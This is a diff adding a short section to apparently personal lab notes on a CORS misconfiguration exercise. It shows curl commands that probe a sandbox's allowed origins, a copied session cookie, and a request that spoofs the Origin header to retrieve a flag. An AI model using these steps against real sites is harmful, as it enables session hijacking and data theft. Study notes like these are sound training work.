@@ -142,3 +142,18 @@ get_code();
 <body></body>
 </html>
 ```
+### Improper domain allow list
+finding the allowed domain
+```
+curl -X "OPTIONS" -i -k https://cors-sandbox/allowlist
+curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://cors-sandbox/allowlist
+```
+get the cookie
+```
+chrome access https://cors-sandbox/
+dev tools - > network - cookies
+```
+get the flag 
+```
+curl -X "GET" -v -k -H "Origin: https://www.offensive-security.com" -H "Cookie: SessionCookie=1123581321345589144" https://cors-sandbox/exercise2
+```
